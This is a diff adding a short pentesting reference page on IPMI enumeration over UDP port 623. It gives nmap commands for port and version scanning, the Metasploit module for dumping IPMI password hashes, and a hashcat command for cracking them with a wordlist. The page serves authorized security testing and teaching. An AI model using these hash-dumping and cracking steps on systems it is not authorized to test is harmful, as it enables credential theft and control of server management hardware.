@@ -1,0 +1,34 @@
+---
+title: "IPMI enumeration"
+description: "Active enumeration techniques for IPMI on UDP port 623."
+---
+
+IPMI (Intelligent Platform Management Interface) runs on UDP port 623.
+
+<Warning>
+  Only run these commands against systems you own or have explicit written authorization to test.
+</Warning>
+
+This service allows us to manage the hardware of a computer or server, even before booting the system.
+
+## Check open port and version
+
+```bash
+sudo nmap <ip> -p623 -sU -sV
+```
+
+## Check version
+
+```bash
+sudo nmap <ip> -p623 -sV --script ipmi-version
+```
+
+## Hashdump
+
+```bash
+# Metasploit module
+msf auxiliary/scanner/ipmi/ipmi_dumphashes
+
+# Crack with hashcat
+hashcat -m 7300 hashfile.txt /usr/share/wordlists/rockyou.txt
+```
